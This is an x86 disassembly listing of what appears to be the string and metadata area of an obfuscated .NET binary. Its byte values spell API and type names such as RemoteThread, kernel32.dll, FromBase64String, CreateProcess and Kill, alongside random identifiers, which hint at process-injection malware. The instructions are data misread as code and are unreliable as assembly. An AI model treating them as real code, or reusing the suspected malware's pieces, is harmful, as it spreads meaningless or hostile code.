100030d6:	65 6d                	gs insl (%dx),%es:(%edi)
100030d8:	6f                   	outsl  %ds:(%esi),(%dx)
100030d9:	74 65                	je     0x10003140
100030db:	54                   	push   %esp
100030dc:	68 72 65 61 64       	push   $0x64616572
100030e1:	00 41 64             	add    %al,0x64(%ecx)
100030e4:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
100030e8:	74 5f                	je     0x10003149
100030ea:	48                   	dec    %eax
100030eb:	61                   	popa
100030ec:	73 45                	jae    0x10003133
100030ee:	78 69                	js     0x10003159
100030f0:	74 65                	je     0x10003157
100030f2:	64 00 59 6d          	add    %bl,%fs:0x6d(%ecx)
100030f6:	59                   	pop    %ecx
100030f7:	72 54                	jb     0x1000314d
100030f9:	45                   	inc    %ebp
100030fa:	6c                   	insb   (%dx),%es:(%edi)
100030fb:	6f                   	outsl  %ds:(%esi),(%dx)
100030fc:	67 61                	addr16 popa
100030fe:	4b                   	dec    %ebx
100030ff:	56                   	push   %esi
10003100:	52                   	push   %edx
10003101:	68 32 32 42 30       	push   $0x30423232
10003106:	47                   	inc    %edi
10003107:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
1000310b:	70 6c                	jo     0x10003179
1000310d:	61                   	popa
1000310e:	63 65 00             	arpl   %esp,0x0(%ebp)
10003111:	45                   	inc    %ebp
10003112:	6e                   	outsb  %ds:(%esi),(%dx)
10003113:	75 6d                	jne    0x10003182
10003115:	65 72 61             	gs jb  0x10003179
10003118:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
1000311c:	43                   	inc    %ebx
1000311d:	6c                   	insb   (%dx),%es:(%edi)
1000311e:	6f                   	outsl  %ds:(%esi),(%dx)
1000311f:	73 65                	jae    0x10003186
10003121:	48                   	dec    %eax
10003122:	61                   	popa
10003123:	6e                   	outsb  %ds:(%esi),(%dx)
10003124:	64 6c                	fs insb (%dx),%es:(%edi)
10003126:	65 00 46 69          	add    %al,%gs:0x69(%esi)
1000312a:	6c                   	insb   (%dx),%es:(%edi)
1000312b:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
1000312f:	6c                   	insb   (%dx),%es:(%edi)
10003130:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10003134:	6d                   	insl   (%dx),%es:(%edi)
10003135:	62 69 6e             	bound  %ebp,0x6e(%ecx)
10003138:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
1000313c:	6c                   	insb   (%dx),%es:(%edi)
1000313d:	75 65                	jne    0x100031a4
1000313f:	54                   	push   %esp
10003140:	79 70                	jns    0x100031b2
10003142:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
10003146:	65 72 65             	gs jb  0x100031ae
10003149:	00 53 79             	add    %dl,0x79(%ebx)
1000314c:	73 74                	jae    0x100031c2
1000314e:	65 6d                	gs insl (%dx),%es:(%edi)
10003150:	2e 43                	cs inc %ebx
10003152:	6f                   	outsl  %ds:(%esi),(%dx)
10003153:	72 65                	jb     0x100031ba
10003155:	00 43 6f             	add    %al,0x6f(%ebx)
10003158:	6d                   	insl   (%dx),%es:(%edi)
10003159:	70 69                	jo     0x100031c4
1000315b:	6c                   	insb   (%dx),%es:(%edi)
1000315c:	65 72 47             	gs jb  0x100031a6
1000315f:	65 6e                	outsb  %gs:(%esi),(%dx)
10003161:	65 72 61             	gs jb  0x100031c5
10003164:	74 65                	je     0x100031cb
10003166:	64 41                	fs inc %ecx
10003168:	74 74                	je     0x100031de
1000316a:	72 69                	jb     0x100031d5
1000316c:	62 75 74             	bound  %esi,0x74(%ebp)
1000316f:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10003173:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
1000317a:	62 
1000317b:	75 74                	jne    0x100031f1
1000317d:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10003182:	75 67                	jne    0x100031eb
10003184:	67 61                	addr16 popa
10003186:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
1000318a:	74 74                	je     0x10003200
1000318c:	72 69                	jb     0x100031f7
1000318e:	62 75 74             	bound  %esi,0x74(%ebp)
10003191:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10003195:	6d                   	insl   (%dx),%es:(%edi)
10003196:	56                   	push   %esi
10003197:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
1000319e:	74 74                	je     0x10003214
100031a0:	72 69                	jb     0x1000320b
100031a2:	62 75 74             	bound  %esi,0x74(%ebp)
100031a5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100031a9:	73 65                	jae    0x10003210
100031ab:	6d                   	insl   (%dx),%es:(%edi)
100031ac:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
100031b0:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
100031b7:	72 
100031b8:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
100031bf:	73 73                	jae    0x10003234
100031c1:	65 6d                	gs insl (%dx),%es:(%edi)
100031c3:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
100031c7:	72 61                	jb     0x1000322a
100031c9:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
100031cc:	61                   	popa
100031cd:	72 6b                	jb     0x1000323a
100031cf:	41                   	inc    %ecx
100031d0:	74 74                	je     0x10003246
100031d2:	72 69                	jb     0x1000323d
100031d4:	62 75 74             	bound  %esi,0x74(%ebp)
100031d7:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
100031dc:	67 65 74 46          	addr16 gs je 0x10003226
100031e0:	72 61                	jb     0x10003243
100031e2:	6d                   	insl   (%dx),%es:(%edi)
100031e3:	65 77 6f             	gs ja  0x10003255
100031e6:	72 6b                	jb     0x10003253
100031e8:	41                   	inc    %ecx
100031e9:	74 74                	je     0x1000325f
100031eb:	72 69                	jb     0x10003256
100031ed:	62 75 74             	bound  %esi,0x74(%ebp)
100031f0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100031f4:	73 65                	jae    0x1000325b
100031f6:	6d                   	insl   (%dx),%es:(%edi)
100031f7:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
100031fb:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
10003202:	69 
10003203:	6f                   	outsl  %ds:(%esi),(%dx)
10003204:	6e                   	outsb  %ds:(%esi),(%dx)
10003205:	41                   	inc    %ecx
10003206:	74 74                	je     0x1000327c
10003208:	72 69                	jb     0x10003273
1000320a:	62 75 74             	bound  %esi,0x74(%ebp)
1000320d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003211:	73 65                	jae    0x10003278
10003213:	6d                   	insl   (%dx),%es:(%edi)
10003214:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10003218:	6f                   	outsl  %ds:(%esi),(%dx)
10003219:	6e                   	outsb  %ds:(%esi),(%dx)
1000321a:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
10003220:	74 69                	je     0x1000328b
10003222:	6f                   	outsl  %ds:(%esi),(%dx)
10003223:	6e                   	outsb  %ds:(%esi),(%dx)
10003224:	41                   	inc    %ecx
10003225:	74 74                	je     0x1000329b
10003227:	72 69                	jb     0x10003292
10003229:	62 75 74             	bound  %esi,0x74(%ebp)
1000322c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003230:	73 65                	jae    0x10003297
10003232:	6d                   	insl   (%dx),%es:(%edi)
10003233:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
10003237:	65 73 63             	gs jae 0x1000329d
1000323a:	72 69                	jb     0x100032a5
1000323c:	70 74                	jo     0x100032b2
1000323e:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10003245:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
1000324c:	6f                   	outsl  %ds:(%esi),(%dx)
1000324d:	6d                   	insl   (%dx),%es:(%edi)
1000324e:	70 69                	jo     0x100032b9
10003250:	6c                   	insb   (%dx),%es:(%edi)
10003251:	61                   	popa
10003252:	74 69                	je     0x100032bd
10003254:	6f                   	outsl  %ds:(%esi),(%dx)
10003255:	6e                   	outsb  %ds:(%esi),(%dx)
10003256:	52                   	push   %edx
10003257:	65 6c                	gs insb (%dx),%es:(%edi)
10003259:	61                   	popa
1000325a:	78 61                	js     0x100032bd
1000325c:	74 69                	je     0x100032c7
1000325e:	6f                   	outsl  %ds:(%esi),(%dx)
1000325f:	6e                   	outsb  %ds:(%esi),(%dx)
10003260:	73 41                	jae    0x100032a3
10003262:	74 74                	je     0x100032d8
10003264:	72 69                	jb     0x100032cf
10003266:	62 75 74             	bound  %esi,0x74(%ebp)
10003269:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000326d:	73 65                	jae    0x100032d4
1000326f:	6d                   	insl   (%dx),%es:(%edi)
10003270:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
10003274:	72 6f                	jb     0x100032e5
10003276:	64 75 63             	fs jne 0x100032dc
10003279:	74 41                	je     0x100032bc
1000327b:	74 74                	je     0x100032f1
1000327d:	72 69                	jb     0x100032e8
1000327f:	62 75 74             	bound  %esi,0x74(%ebp)
10003282:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003286:	73 65                	jae    0x100032ed
10003288:	6d                   	insl   (%dx),%es:(%edi)
10003289:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
1000328d:	6f                   	outsl  %ds:(%esi),(%dx)
1000328e:	70 79                	jo     0x10003309
10003290:	72 69                	jb     0x100032fb
10003292:	67 68 74 41 74 74    	addr16 push $0x74744174
10003298:	72 69                	jb     0x10003303
1000329a:	62 75 74             	bound  %esi,0x74(%ebp)
1000329d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100032a1:	73 65                	jae    0x10003308
100032a3:	6d                   	insl   (%dx),%es:(%edi)
100032a4:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
100032a8:	6f                   	outsl  %ds:(%esi),(%dx)
100032a9:	6d                   	insl   (%dx),%es:(%edi)
100032aa:	70 61                	jo     0x1000330d
100032ac:	6e                   	outsb  %ds:(%esi),(%dx)
100032ad:	79 41                	jns    0x100032f0
100032af:	74 74                	je     0x10003325
100032b1:	72 69                	jb     0x1000331c
100032b3:	62 75 74             	bound  %esi,0x74(%ebp)
100032b6:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
100032ba:	6e                   	outsb  %ds:(%esi),(%dx)
100032bb:	74 69                	je     0x10003326
100032bd:	6d                   	insl   (%dx),%es:(%edi)
100032be:	65 43                	gs inc %ebx
100032c0:	6f                   	outsl  %ds:(%esi),(%dx)
100032c1:	6d                   	insl   (%dx),%es:(%edi)
100032c2:	70 61                	jo     0x10003325
100032c4:	74 69                	je     0x1000332f
100032c6:	62 69 6c             	bound  %ebp,0x6c(%ecx)
100032c9:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
100032d0:	69 
100032d1:	62 75 74             	bound  %esi,0x74(%ebp)
100032d4:	65 00 53 69          	add    %dl,%gs:0x69(%ebx)
100032d8:	7a 65                	jp     0x1000333f
100032da:	4f                   	dec    %edi
100032db:	66 00 57 70          	data16 add %dl,0x70(%edi)
100032df:	45                   	inc    %ebp
100032e0:	7a 48                	jp     0x1000332a
100032e2:	43                   	inc    %ebx
100032e3:	4d                   	dec    %ebp
100032e4:	45                   	inc    %ebp
100032e5:	71 4d                	jno    0x10003334
100032e7:	39 58 78             	cmp    %ebx,0x78(%eax)
100032ea:	66 00 48 43          	data16 add %cl,0x43(%eax)
100032ee:	4b                   	dec    %ebx
100032ef:	6b 4f 55 73          	imul   $0x73,0x55(%edi),%ecx
100032f3:	52                   	push   %edx
100032f4:	67 36 34 67          	addr16 ss xor $0x67,%al
100032f8:	75 32                	jne    0x1000332c
100032fa:	67 00 43 57          	add    %al,0x57(%bp,%di)
100032fe:	51                   	push   %ecx
100032ff:	63 4f 4a             	arpl   %ecx,0x4a(%edi)
10003302:	48                   	dec    %eax
10003303:	41                   	inc    %ecx
10003304:	38 47 51             	cmp    %al,0x51(%edi)
10003307:	4b                   	dec    %ebx
10003308:	7a 51                	jp     0x1000335b
1000330a:	6a 58                	push   $0x58
1000330c:	61                   	popa
1000330d:	57                   	push   %edi
1000330e:	6c                   	insb   (%dx),%es:(%edi)
1000330f:	67 00 53 79          	add    %dl,0x79(%bp,%di)
10003313:	73 74                	jae    0x10003389
10003315:	65 6d                	gs insl (%dx),%es:(%edi)
10003317:	2e 54                	cs push %esp
10003319:	68 72 65 61 64       	push   $0x64616572
1000331e:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
10003325:	6f                   	outsl  %ds:(%esi),(%dx)
10003326:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
1000332d:	73 
1000332e:	74 65                	je     0x10003395
10003330:	6d                   	insl   (%dx),%es:(%edi)
10003331:	2e 52                	cs push %edx
10003333:	75 6e                	jne    0x100033a3
10003335:	74 69                	je     0x100033a0
10003337:	6d                   	insl   (%dx),%es:(%edi)
10003338:	65 2e 56             	gs cs push %esi
1000333b:	65 72 73             	gs jb  0x100033b1
1000333e:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
10003345:	46                   	inc    %esi
10003346:	72 6f                	jb     0x100033b7
10003348:	6d                   	insl   (%dx),%es:(%edi)
10003349:	42                   	inc    %edx
1000334a:	61                   	popa
1000334b:	73 65                	jae    0x100033b2
1000334d:	36 34 53             	ss xor $0x53,%al
10003350:	74 72                	je     0x100033c4
10003352:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
10003359:	53                   	push   %ebx
1000335a:	74 72                	je     0x100033ce
1000335c:	69 6e 67 00 54 66 62 	imul   $0x62665400,0x67(%esi),%ebp
10003363:	42                   	inc    %edx
10003364:	65 66 45             	gs inc %bp
10003367:	73 39                	jae    0x100033a2
10003369:	62 54 69 34          	bound  %edx,0x34(%ecx,%ebp,2)
1000336d:	75 67                	jne    0x100033d6
1000336f:	00 4b 67             	add    %cl,0x67(%ebx)
10003372:	4a                   	dec    %edx
10003373:	4c                   	dec    %esp
10003374:	46                   	inc    %esi
10003375:	69 5a 63 36 59 77 49 	imul   $0x49775936,0x63(%edx),%ebx
1000337c:	49                   	dec    %ecx
1000337d:	58                   	pop    %eax
1000337e:	61                   	popa
1000337f:	55                   	push   %ebp
10003380:	49                   	dec    %ecx
10003381:	39 52 6f             	cmp    %edx,0x6f(%edx)
10003384:	68 00 50 61 74       	push   $0x74615000
10003389:	68 00 67 65 74       	push   $0x74656700
1000338e:	5f                   	pop    %edi
1000338f:	4c                   	dec    %esp
10003390:	65 6e                	outsb  %gs:(%esi),(%dx)
10003392:	67 74 68             	addr16 je 0x100033fd
10003395:	00 49 4e             	add    %cl,0x4e(%ecx)
10003398:	51                   	push   %ecx
10003399:	6e                   	outsb  %ds:(%esi),(%dx)
1000339a:	74 73                	je     0x1000340f
1000339c:	57                   	push   %edi
1000339d:	4b                   	dec    %ebx
1000339e:	32 4a 6d             	xor    0x6d(%edx),%cl
100033a1:	77 59                	ja     0x100033fc
100033a3:	73 4c                	jae    0x100033f1
100033a5:	72 45                	jb     0x100033ec
100033a7:	49                   	dec    %ecx
100033a8:	6d                   	insl   (%dx),%es:(%edi)
100033a9:	65 69 00 56 73 4b 69 	imul   $0x694b7356,%gs:(%eax),%eax
100033b0:	63 73 68             	arpl   %esi,0x68(%ebx)
100033b3:	48                   	dec    %eax
100033b4:	53                   	push   %ebx
100033b5:	37                   	aaa
100033b6:	72 36                	jb     0x100033ee
100033b8:	78 6f                	js     0x10003429
100033ba:	39 47 33             	cmp    %eax,0x33(%edi)
100033bd:	6a 67                	push   $0x67
100033bf:	6b 00 47             	imul   $0x47,(%eax),%eax
100033c2:	65 67 6b 4d 51 74    	imul   $0x74,%gs:0x51(%di),%ecx
100033c8:	36 78 6a             	ss js  0x10003435
100033cb:	52                   	push   %edx
100033cc:	34 6c                	xor    $0x6c,%al
100033ce:	4e                   	dec    %esi
100033cf:	4c                   	dec    %esp
100033d0:	79 32                	jns    0x10003404
100033d2:	43                   	inc    %ebx
100033d3:	62 55 4a             	bound  %edx,0x4a(%ebp)
100033d6:	6c                   	insb   (%dx),%es:(%edi)
100033d7:	00 4d 61             	add    %cl,0x61(%ebp)
100033da:	72 73                	jb     0x1000344f
100033dc:	68 61 6c 00 6b       	push   $0x6b006c61
100033e1:	65 72 6e             	gs jb  0x10003452
100033e4:	65 6c                	gs insb (%dx),%es:(%edi)
100033e6:	33 32                	xor    (%edx),%esi
100033e8:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
100033eb:	6c                   	insb   (%dx),%es:(%edi)
100033ec:	00 57 70             	add    %dl,0x70(%edi)
100033ef:	45                   	inc    %ebp
100033f0:	7a 48                	jp     0x1000343a
100033f2:	43                   	inc    %ebx
100033f3:	4d                   	dec    %ebp
100033f4:	45                   	inc    %ebp
100033f5:	71 4d                	jno    0x10003444
100033f7:	39 58 78             	cmp    %ebx,0x78(%eax)
100033fa:	66 2e 64 6c          	data16 cs fs insb (%dx),%es:(%edi)
100033fe:	6c                   	insb   (%dx),%es:(%edi)
100033ff:	00 4b 69             	add    %cl,0x69(%ebx)
10003402:	6c                   	insb   (%dx),%es:(%edi)
10003403:	6c                   	insb   (%dx),%es:(%edi)
10003404:	00 42 5a             	add    %al,0x5a(%edx)
10003407:	4c                   	dec    %esp
10003408:	72 6f                	jb     0x10003479
1000340a:	57                   	push   %edi
1000340b:	53                   	push   %ebx
1000340c:	70 66                	jo     0x10003474
1000340e:	56                   	push   %esi
1000340f:	72 73                	jb     0x10003484
10003411:	4d                   	dec    %ebp
10003412:	4c                   	dec    %esp
10003413:	64 6d                	fs insl (%dx),%es:(%edi)
10003415:	55                   	push   %ebp
10003416:	61                   	popa
10003417:	76 71                	jbe    0x1000348a
10003419:	69 30 4e 4c 6d 00    	imul   $0x6d4c4e,(%eax),%esi
1000341f:	53                   	push   %ebx
10003420:	79 73                	jns    0x10003495
10003422:	74 65                	je     0x10003489
10003424:	6d                   	insl   (%dx),%es:(%edi)
10003425:	00 52 61             	add    %dl,0x61(%edx)
10003428:	6e                   	outsb  %ds:(%esi),(%dx)
10003429:	64 6f                	outsl  %fs:(%esi),(%dx)
1000342b:	6d                   	insl   (%dx),%es:(%edi)
1000342c:	00 45 47             	add    %al,0x47(%ebp)
1000342f:	6a 74                	push   $0x74
10003431:	6f                   	outsl  %ds:(%esi),(%dx)
10003432:	7a 78                	jp     0x100034ac
10003434:	42                   	inc    %edx
10003435:	5a                   	pop    %edx
10003436:	54                   	push   %esp
10003437:	4c                   	dec    %esp
10003438:	39 46 75             	cmp    %eax,0x75(%esi)
1000343b:	59                   	pop    %ecx
1000343c:	4f                   	dec    %edi
1000343d:	50                   	push   %eax
1000343e:	34 6b                	xor    $0x6b,%al
10003440:	68 32 69 4f 49       	push   $0x494f6932
10003445:	6e                   	outsb  %ds:(%esi),(%dx)
10003446:	00 42 72             	add    %al,0x72(%edx)
10003449:	4a                   	dec    %edx
1000344a:	4c                   	dec    %esp
1000344b:	6a 4f                	push   $0x4f
1000344d:	6d                   	insl   (%dx),%es:(%edi)
1000344e:	73 6c                	jae    0x100034bc
10003450:	62 4b 75             	bound  %ecx,0x75(%ebx)
10003453:	33 59 51             	xor    0x51(%ecx),%ebx
10003456:	45                   	inc    %ebp
10003457:	63 33                	arpl   %esi,(%ebx)
10003459:	53                   	push   %ebx
1000345a:	6e                   	outsb  %ds:(%esi),(%dx)
1000345b:	00 50 69             	add    %dl,0x69(%eax)
1000345e:	69 41 4e 6a 4c 6b 4e 	imul   $0x4e6b4c6a,0x4e(%ecx),%eax
10003465:	65 65 4b             	gs gs dec %ebx
10003468:	38 4d 47             	cmp    %cl,0x47(%ebp)
1000346b:	7a 69                	jp     0x100034d6
1000346d:	76 45                	jbe    0x100034b4
1000346f:	6a 64                	push   $0x64
10003471:	6e                   	outsb  %ds:(%esi),(%dx)
10003472:	00 41 51             	add    %al,0x51(%ecx)
10003475:	47                   	inc    %edi
10003476:	57                   	push   %edi
10003477:	46                   	inc    %esi
10003478:	6d                   	insl   (%dx),%es:(%edi)
10003479:	6d                   	insl   (%dx),%es:(%edi)
1000347a:	73 6e                	jae    0x100034ea
1000347c:	41                   	inc    %ecx
1000347d:	67 52                	addr16 push %edx
1000347f:	30 35 34 57 63 32    	xor    %dh,0x32635734
10003485:	71 4b                	jno    0x100034d2
10003487:	69 50 4b 6b 6e 00 47 	imul   $0x47006e6b,0x4b(%eax),%edx
1000348e:	65 74 46             	gs je  0x100034d7
10003491:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
10003498:	57 
10003499:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
100034a0:	78 
100034a1:	74 65                	je     0x10003508
100034a3:	6e                   	outsb  %ds:(%esi),(%dx)
100034a4:	73 69                	jae    0x1000350f
100034a6:	6f                   	outsl  %ds:(%esi),(%dx)
100034a7:	6e                   	outsb  %ds:(%esi),(%dx)
100034a8:	00 53 79             	add    %dl,0x79(%ebx)
100034ab:	73 74                	jae    0x10003521
100034ad:	65 6d                	gs insl (%dx),%es:(%edi)
100034af:	2e 52                	cs push %edx
100034b1:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
100034b4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
100034b9:	6e                   	outsb  %ds:(%esi),(%dx)
100034ba:	00 53 65             	add    %dl,0x65(%ebx)
100034bd:	61                   	popa
100034be:	72 63                	jb     0x10003523
100034c0:	68 4f 70 74 69       	push   $0x6974704f
100034c5:	6f                   	outsl  %ds:(%esi),(%dx)
100034c6:	6e                   	outsb  %ds:(%esi),(%dx)
100034c7:	00 45 78             	add    %al,0x78(%ebp)
100034ca:	63 65 70             	arpl   %esp,0x70(%ebp)
100034cd:	74 69                	je     0x10003538
100034cf:	6f                   	outsl  %ds:(%esi),(%dx)
100034d0:	6e                   	outsb  %ds:(%esi),(%dx)
100034d1:	00 50 43             	add    %dl,0x43(%eax)
100034d4:	77 62                	ja     0x10003538
100034d6:	70 70                	jo     0x10003548
100034d8:	30 76 33             	xor    %dh,0x33(%esi)
100034db:	4b                   	dec    %ebx
100034dc:	7a 51                	jp     0x1000352f
100034de:	4a                   	dec    %edx
100034df:	6f                   	outsl  %ds:(%esi),(%dx)
100034e0:	00 53 79             	add    %dl,0x79(%ebx)
100034e3:	65 72 4c             	gs jb  0x10003532
100034e6:	74 6c                	je     0x10003554
100034e8:	71 36                	jno    0x10003520
100034ea:	68 69 72 66 45       	push   $0x45667269
100034ef:	62 42 30             	bound  %eax,0x30(%edx)
100034f2:	4f                   	dec    %edi
100034f3:	36 62 4a 38          	bound  %ecx,%ss:0x38(%edx)
100034f7:	5a                   	pop    %edx
100034f8:	6f                   	outsl  %ds:(%esi),(%dx)
100034f9:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
100034fd:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
10003502:	79 49                	jns    0x1000354d
10003504:	6e                   	outsb  %ds:(%esi),(%dx)
10003505:	66 6f                	outsw  %ds:(%esi),(%dx)
10003507:	00 5a 65             	add    %bl,0x65(%edx)
1000350a:	72 6f                	jb     0x1000357b
1000350c:	00 53 6c             	add    %dl,0x6c(%ebx)
1000350f:	65 65 70 00          	gs gs jo 0x10003513
10003513:	59                   	pop    %ecx
10003514:	55                   	push   %ebp
10003515:	4f                   	dec    %edi
10003516:	44                   	inc    %esp
10003517:	55                   	push   %ebp
10003518:	73 58                	jae    0x10003572
1000351a:	54                   	push   %esp
1000351b:	6c                   	insb   (%dx),%es:(%edi)
1000351c:	44                   	inc    %esp
1000351d:	4a                   	dec    %edx
1000351e:	42                   	inc    %edx
1000351f:	78 57                	js     0x10003578
10003521:	30 71 00             	xor    %dh,0x0(%ecx)
10003524:	53                   	push   %ebx
10003525:	79 73                	jns    0x1000359a
10003527:	74 65                	je     0x1000358e
10003529:	6d                   	insl   (%dx),%es:(%edi)
1000352a:	2e 4c                	cs dec %esp
1000352c:	69 6e 71 00 2e 63 74 	imul   $0x74632e00,0x71(%esi),%ebp
10003533:	6f                   	outsl  %ds:(%esi),(%dx)
10003534:	72 00                	jb     0x10003536
10003536:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
1000353a:	6f                   	outsl  %ds:(%esi),(%dx)
1000353b:	72 00                	jb     0x1000353d
1000353d:	49                   	dec    %ecx
1000353e:	6e                   	outsb  %ds:(%esi),(%dx)
1000353f:	74 50                	je     0x10003591
10003541:	74 72                	je     0x100035b5
10003543:	00 4f 77             	add    %cl,0x77(%edi)
10003546:	67 41                	addr16 inc %ecx
10003548:	4d                   	dec    %ebp
10003549:	51                   	push   %ecx
1000354a:	77 36                	ja     0x10003582
1000354c:	72 42                	jb     0x10003590
1000354e:	6e                   	outsb  %ds:(%esi),(%dx)
1000354f:	4a                   	dec    %edx
10003550:	4f                   	dec    %edi
10003551:	76 38                	jbe    0x1000358b
10003553:	37                   	aaa
10003554:	6a 45                	push   $0x45
10003556:	42                   	inc    %edx
10003557:	73 00                	jae    0x10003559
10003559:	53                   	push   %ebx
1000355a:	79 73                	jns    0x100035cf
1000355c:	74 65                	je     0x100035c3
1000355e:	6d                   	insl   (%dx),%es:(%edi)
1000355f:	2e 44                	cs inc %esp
10003561:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10003568:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
1000356f:	74 65                	je     0x100035d6
10003571:	6d                   	insl   (%dx),%es:(%edi)
10003572:	2e 52                	cs push %edx
10003574:	75 6e                	jne    0x100035e4
10003576:	74 69                	je     0x100035e1
10003578:	6d                   	insl   (%dx),%es:(%edi)
10003579:	65 2e 49             	gs cs dec %ecx
1000357c:	6e                   	outsb  %ds:(%esi),(%dx)
1000357d:	74 65                	je     0x100035e4
1000357f:	72 6f                	jb     0x100035f0
10003581:	70 53                	jo     0x100035d6
10003583:	65 72 76             	gs jb  0x100035fc
10003586:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
1000358d:	73 74                	jae    0x10003603
1000358f:	65 6d                	gs insl (%dx),%es:(%edi)
10003591:	2e 52                	cs push %edx
10003593:	75 6e                	jne    0x10003603
10003595:	74 69                	je     0x10003600
10003597:	6d                   	insl   (%dx),%es:(%edi)
10003598:	65 2e 43             	gs cs inc %ebx
1000359b:	6f                   	outsl  %ds:(%esi),(%dx)
1000359c:	6d                   	insl   (%dx),%es:(%edi)
1000359d:	70 69                	jo     0x10003608
1000359f:	6c                   	insb   (%dx),%es:(%edi)
100035a0:	65 72 53             	gs jb  0x100035f6
100035a3:	65 72 76             	gs jb  0x1000361c
100035a6:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
100035ad:	62 75 67             	bound  %esi,0x67(%ebp)
100035b0:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
100035b7:	65 
100035b8:	73 00                	jae    0x100035ba
100035ba:	47                   	inc    %edi
100035bb:	65 74 46             	gs je  0x10003604
100035be:	69 6c 65 73 00 43 6f 	imul   $0x6e6f4300,0x73(%ebp,%eiz,2),%ebp
100035c5:	6e 
100035c6:	74 61                	je     0x10003629
100035c8:	69 6e 73 00 67 65 74 	imul   $0x74656700,0x73(%esi),%ebp
100035cf:	5f                   	pop    %edi
100035d0:	43                   	inc    %ebx
100035d1:	68 61 72 73 00       	push   $0x737261
100035d6:	43                   	inc    %ebx
100035d7:	72 65                	jb     0x1000363e
100035d9:	61                   	popa
100035da:	74 65                	je     0x10003641
100035dc:	50                   	push   %eax
100035dd:	72 6f                	jb     0x1000364e
100035df:	63 65 73             	arpl   %esp,0x73(%ebp)
100035e2:	73 00                	jae    0x100035e4
100035e4:	43                   	inc    %ebx
100035e5:	6f                   	outsl  %ds:(%esi),(%dx)
100035e6:	6e                   	outsb  %ds:(%esi),(%dx)
100035e7:	63 61 74             	arpl   %esp,0x74(%ecx)
100035ea:	00 52 65             	add    %dl,0x65(%edx)
100035ed:	70 65                	jo     0x10003654
100035ef:	61                   	popa
100035f0:	74 00                	je     0x100035f2
100035f2:	4f                   	dec    %edi
100035f3:	62 6a 65             	bound  %ebp,0x65(%edx)
100035f6:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
100035fa:	65 6c                	gs insb (%dx),%es:(%edi)
100035fc:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
10003601:	6f                   	outsl  %ds:(%esi),(%dx)
10003602:	6e                   	outsb  %ds:(%esi),(%dx)
10003603:	76 65                	jbe    0x1000366a
10003605:	72 74                	jb     0x1000367b
10003607:	00 4e 65             	add    %cl,0x65(%esi)
1000360a:	78 74                	js     0x10003680
1000360c:	00 53 79             	add    %dl,0x79(%ebx)
1000360f:	73 74                	jae    0x10003685
10003611:	65 6d                	gs insl (%dx),%es:(%edi)
10003613:	2e 54                	cs push %esp
10003615:	65 78 74             	gs js  0x1000368c
10003618:	00 54 76 4f          	add    %dl,0x4f(%esi,%esi,2)
1000361c:	45                   	inc    %ebp
1000361d:	74 57                	je     0x10003676
1000361f:	46                   	inc    %esi
10003620:	68 38 64 62 75       	push   $0x75626438
